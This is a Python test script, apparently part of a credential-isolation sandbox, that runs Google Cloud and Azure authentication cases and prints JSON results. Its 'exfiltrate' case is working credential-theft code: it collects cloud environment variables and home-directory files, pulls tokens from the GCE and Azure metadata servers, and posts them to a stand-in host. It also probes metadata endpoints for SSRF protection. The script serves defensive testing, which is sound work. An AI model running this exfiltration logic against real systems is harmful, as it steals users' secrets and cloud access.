"""What a program in the computer does. One case per run; prints one JSON line.

    python3 guest_cases.py <case>

The computer holds no cloud key file. For the exchange cases it holds files whose secrets are
placeholders: an `authorized_user` ADC file and an MSAL refresh token. The tokens each case got are
printed too, so run.py can check whether they work from outside the computer.
"""
import json, os, sys, traceback

case = sys.argv[1]
out = {"case": case}


def done(ok, **kw):
    out.update(ok=ok, **kw); print(json.dumps(out)); sys.exit(0)


try:
    if case == "google_metadata_storage":
        import google.auth, google.auth.transport.requests
        from google.cloud import storage
        creds, project = google.auth.default()
        creds.refresh(google.auth.transport.requests.Request())
        names = [b.name for b in storage.Client(credentials=creds, project=project).list_blobs("demo-bucket")]
        done(names == ["hello.txt"], credential_type=type(creds).__module__ + "." + type(creds).__name__,
             project=project, tokens=[creds.token])

    if case == "google_id_token_cloud_run":
        import google.auth.transport.requests, google.oauth2.id_token, requests
        aud = "https://hello-abc.a.run.app"
        tok = google.oauth2.id_token.fetch_id_token(google.auth.transport.requests.Request(), aud)
        r = requests.get(aud + "/", headers={"Authorization": "Bearer " + tok}, timeout=10)
        done(r.status_code == 200, status=r.status_code, tokens=[tok])

    if case == "google_id_token_decode":  # a program that reads its id token's claims, as many do
        import google.auth.transport.requests, google.oauth2.id_token, jwt
        tok = google.oauth2.id_token.fetch_id_token(google.auth.transport.requests.Request(), "https://hello-abc.a.run.app")
        c = jwt.decode(tok, options={"verify_signature": False})
        done(True, email=c.get("email"), tokens=[tok])

    if case == "google_authorized_user_exchange":
        import google.auth, google.auth.transport.requests
        from google.cloud import storage
        creds, _ = google.auth.default()  # GOOGLE_APPLICATION_CREDENTIALS: an authorized_user file with a placeholder
        creds.refresh(google.auth.transport.requests.Request())
        names = [b.name for b in storage.Client(credentials=creds, project="silo-demo").list_blobs("demo-bucket")]
        done(names == ["hello.txt"], credential_type=type(creds).__name__, tokens=[creds.token, getattr(creds, "id_token", None)])

    if case == "azure_managed_identity":
        from azure.identity import ManagedIdentityCredential
        from azure.mgmt.resource.subscriptions import SubscriptionClient
        cred = ManagedIdentityCredential()
        tok = cred.get_token("https://management.azure.com/.default").token
        subs = [s.subscription_id for s in SubscriptionClient(cred).subscriptions.list()]
        done(subs == ["0000"], tokens=[tok])

    if case == "azure_default_credential":
        from azure.identity import DefaultAzureCredential
        from azure.mgmt.resource.subscriptions import SubscriptionClient
        cred = DefaultAzureCredential(exclude_cli_credential=True, exclude_powershell_credential=True,
                                      exclude_developer_cli_credential=True)
        tok = cred.get_token("https://management.azure.com/.default").token
        subs = [s.subscription_id for s in SubscriptionClient(cred).subscriptions.list()]
        done(subs == ["0000"], tokens=[tok])

    if case == "azure_client_secret_exchange":
        from azure.identity import ClientSecretCredential
        from azure.mgmt.resource.subscriptions import SubscriptionClient
        cred = ClientSecretCredential(os.environ["AZURE_TENANT_ID"], os.environ["AZURE_CLIENT_ID"], os.environ["AZURE_CLIENT_SECRET"])
        tok = cred.get_token("https://management.azure.com/.default").token
        subs = [s.subscription_id for s in SubscriptionClient(cred).subscriptions.list()]
        done(subs == ["0000"], tokens=[tok])

    if case == "azure_refresh_rotation":
        import msal
        app = msal.PublicClientApplication(os.environ["AZURE_CLIENT_ID"],
                                           authority=f"https://login.microsoftonline.com/{os.environ['AZURE_TENANT_ID']}")
        rt = open(os.path.expanduser("~/.azure-refresh-token")).read().strip()
        toks, rts = [], []
        for i in range(3):  # three refreshes in a row: each must use the refresh token the last one returned
            r = app.acquire_token_by_refresh_token(rt, scopes=["https://management.azure.com/.default"])
            if "access_token" not in r: done(False, round=i, error=r.get("error_description", r)[:200], tokens=toks)
            toks.append(r["access_token"]); rt = r.get("refresh_token", rt); rts.append(rt)
        open(os.path.expanduser("~/.azure-refresh-token"), "w").write(rt)
        done(True, refresh_tokens_seen=len(set(rts)), tokens=toks + rts)

    if case == "exfiltrate":
        # Everything the computer can read that looks like a credential, sent to an outsider's host.
        import requests
        loot = {"env": {k: v for k, v in os.environ.items() if "AZURE" in k or "GOOGLE" in k}}
        for f in [os.path.join(r, n) for r, _, ns in os.walk(os.path.expanduser("~")) for n in ns]:
            if os.path.isfile(f) and os.path.getsize(f) < 2_000_000:
                try: loot[f] = open(f, errors="replace").read()
                except OSError: pass
        try:  # and fresh tokens from the metadata server
            loot["gce"] = requests.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                                       headers={"Metadata-Flavor": "Google"}, timeout=5).text
            loot["imds"] = requests.get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                                        headers={"Metadata": "true"}, timeout=5).text
        except Exception as e:
            loot["err"] = str(e)
        r = requests.post("https://collector.example/loot", data=json.dumps(loot), timeout=10)
        done(r.status_code == 200, files=len(loot))

    if case == "metadata_ssrf_guards":
        import requests
        u = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
        a = requests.get(u, timeout=5).status_code
        b = requests.get(u, headers={"Metadata-Flavor": "Google", "X-Forwarded-For": "1.2.3.4"}, timeout=5).status_code
        c = requests.get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=x", timeout=5).status_code
        done(a == 403 and b == 403 and c == 400, no_header=a, forwarded=b, azure_no_header=c)

    done(False, error="unknown case")
except SystemExit:
    raise
except Exception as e:
    done(False, error=f"{type(e).__name__}: {str(e)[:300]}", where=traceback.format_exc().splitlines()[-3][:200])
